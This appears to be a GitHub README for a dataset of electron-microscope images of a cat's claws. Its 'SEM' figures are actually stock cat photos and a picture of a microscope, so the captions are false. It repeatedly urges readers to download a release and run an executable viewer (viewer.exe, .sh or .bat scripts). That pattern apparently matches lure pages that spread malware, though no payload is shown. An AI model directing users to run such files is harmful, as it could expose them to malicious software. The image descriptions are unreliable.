# Kitty Claws — SEM Images of Cat Claws | UPenn Nanotech 🐾🔬

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/DiegoX12/kitty-claws/releases)

Microscopic images of Kitty's claws captured with a Quanta 600 FEG Environmental Scanning Electron Microscope (ESEM). Images come from the Nanoscale Characterization Facility at the Krishna P. Singh Center for Nanotechnology, University of Pennsylvania. The set shows surface detail, wear patterns, and micro-structure at scales from micrometers down to nanometers.

Badges
- [![License](https://img.shields.io/badge/license-CC%20BY--NC--SA-green)](LICENSE)
- [![Topics](https://img.shields.io/badge/topics-bootstrap%20%7C%20sem%20%7C%20microscopy-lightgrey)](#)
- Tags: bootstrap, bootstrap-icons, bootstrap5, cat, cats, css, esem, html, html5, kitty, microscope, microscope-images, microscopic-images, microscopy, microscopy-images, nanocharacterization, penn, quanta, sem, upenn

Table of contents
- Gallery
- About the data
- How the images were made
- File list and structure
- Quick start
- Releases
- Usage and viewing
- Metadata and methods
- Cite this work
- Contributing
- License

Gallery — highlight images
Images show the claw tip, cross-sections, debris, and coating contrasts typical of ESEM secondary electron imaging.

![Claw tip, low mag](https://images.unsplash.com/photo-1518791841217-8f162f1e1131?auto=format&fit=crop&w=1200&q=80)
*Fig 1. Claw tip, low magnification. Shows overall shape and a fracture near the apex.*

![Claw microstructure, high mag](https://upload.wikimedia.org/wikipedia/commons/7/77/Scanning_electron_microscope.jpg)
*Fig 2. High magnification SEM view showing layered keratin and surface roughness.*

![Claw cross-section](https://images.unsplash.com/photo-1543852786-1cf6624b9987?auto=format&fit=crop&w=1200&q=80)
*Fig 3. Cross-section view after microtome and conductive coating. Contrast highlights layers.*

Each image in this repository includes a high-resolution TIFF, a web-ready PNG, and basic metadata (magnification, detector, accelerating voltage, scale bar). See the "File list and structure" section for details.

About the data
- Subject: Kitty (domestic cat) claws.
- Instrument: Quanta 600 FEG ESEM.
- Facility: Nanoscale Characterization Facility, Krishna P. Singh Center for Nanotechnology, University of Pennsylvania.
- Purpose: Document micro-scale wear and morphology of claws for outreach and reference.
- Format: TIFF (lossless), PNG (preview), JSON metadata for each image.
- Typical resolution: 2048×2048 to 8000×8000 pixels for TIFF. PNG previews at 1200×1200 px.

How the images were made
- Sample prep: Cleaned with isopropyl alcohol. Dried in air. Mounted on aluminum stubs with carbon tape.
- Coating: Conductive coating applied where required (carbon or thin gold/palladium).
- ESEM settings:
  - Instrument: Quanta 600 FEG.
  - Mode: Low-vacuum ESEM or high-vacuum SEM depending on sample readiness.
  - Detector: Secondary electron (SE) for topography; backscattered electron (BSE) for composition contrast.
  - Accelerating voltage: 5–20 kV depending on magnification and coating.
  - Spot size: Adjusted to balance resolution and beam-sample interaction.
- Imaging strategy: Start at low magnification, locate regions of interest, and acquire a set of images at increasing magnification. Acquire scale bars and capture instrument settings in metadata.

File list and structure
- /images/
  - *.tif — original high-resolution TIFF images.
  - *.png — compressed preview images for web.
  - *.json — per-image metadata (magnification, voltage, detector, working distance).
- /figures/ — curated composites and labeled figures.
- /data/ — raw instrument logs and notes.
- /docs/ — markdown notes and acquisition protocols.
- LICENSE — license file.

Quick start — view images locally
- Download the repository or fetch a release asset from:
  https://github.com/DiegoX12/kitty-claws/releases
- If you use the Releases page, download the release file (for example: kitty-claws-v1.0.zip). Run the included viewer script in the archive to open the preview set. For example:
  - On macOS / Linux: unzip the archive and run ./view-claws.sh
  - On Windows: unzip the archive and run view-claws.bat or open the viewer.exe
- The release asset includes:
  - a preview gallery (PNG),
  - a small offline viewer,
  - README and metadata files.
- The Releases page hosts signed artifacts and the most stable image bundles.

Releases
[![Download Releases](https://img.shields.io/badge/Get%20Releases-Download%20Bundle-green?logo=github)](https://github.com/DiegoX12/kitty-claws/releases)

Visit the Releases page to find packaged image sets. Each release includes:
- A zip or tarball with high-resolution TIFFs.
- A preview gallery in PNG.
- An index.json file with metadata.
- A small, cross-platform viewer script to open the previews.

Usage and viewing
- Web: Use the PNG previews for quick browsing. They work in any browser.
- Local: Use ImageJ / Fiji to open TIFFs and inspect metadata and scale bars.
- CLI tools: Use libtiff or exiftool to inspect and process TIFFs.
- Viewer script: The release viewer will open the preview gallery and point to the high-resolution files. Run the viewer from the release archive after download.
- Processing tips:
  - Use non-destructive edits. Work on copies.
  - Preserve the original TIFFs for any quantitative work.
  - For publication, export PNG or JPEG at 300 dpi with an embedded scale bar.

Metadata and methods
Each image includes a JSON sidecar with these fields:
- filename
- instrument
- detector
- accelerating_voltage (kV)
- working_distance (mm)
- magnification (×)
- pixel_size (nm)
- coating (if any)
- notes (free text)

Example metadata (stored in JSON):
{
  "filename": "claw-tip-01.tif",
  "instrument": "Quanta 600 FEG ESEM",
  "detector": "SE",
  "accelerating_voltage": 10,
  "working_distance": 10.5,
  "magnification": 5000,
  "pixel_size": 12.3,
  "coating": "carbon",
  "notes": "Low vacuum, gentle beam to preserve surface detail."
}

Cite this work
- If you use these images in a paper or presentation, cite the repository and the facility. Suggested citation:
  Kitty Claws (DiegoX12). Microscopic images of cat claws captured with a Quanta 600 FEG ESEM at the Krishna P. Singh Center for Nanotechnology, University of Pennsylvania. GitHub repository: https://github.com/DiegoX12/kitty-claws
- Include instrument details (Quanta 600 FEG) and facility credit when appropriate.

Contributing
- Report issues via GitHub Issues.
- Propose additions via pull requests.
- When adding images:
  - Include original TIFF.
  - Add PNG preview.
  - Include JSON metadata with full acquisition settings.
  - Add a brief note with sample prep and any post-processing performed.
- Please respect animal welfare and ethics. Provide documentation if the sample comes from a study.

FAQ
- Q: Can I use these images for education?
  A: Yes. The images aim to help teaching and outreach. Check the LICENSE for reuse terms.
- Q: Are raw logs available?
  A: Yes. See /data/ for raw instrument logs saved at acquisition time.
- Q: Where can I get the viewer?
  A: The viewer ships with each release on the Releases page:
  https://github.com/DiegoX12/kitty-claws/releases
  Download the release bundle and run the included viewer script.

Contact
- Repo: DiegoX12 / kitty-claws
- Facility: Nanoscale Characterization Facility, Krishna P. Singh Center for Nanotechnology, UPenn.
- Issues: Use GitHub Issues to report problems or request new images.

License
- The images use Creative Commons BY-NC-SA (see LICENSE file). The LICENSE file in the repo contains full terms.

Acknowledgments
- Quanta 600 FEG ESEM at the Krishna P. Singh Center for Nanotechnology.
- Nanoscale Characterization Facility staff for instrument support.
- Kitty for posing.

Release link reminder
- Download and run the release bundle from:
  https://github.com/DiegoX12/kitty-claws/releases

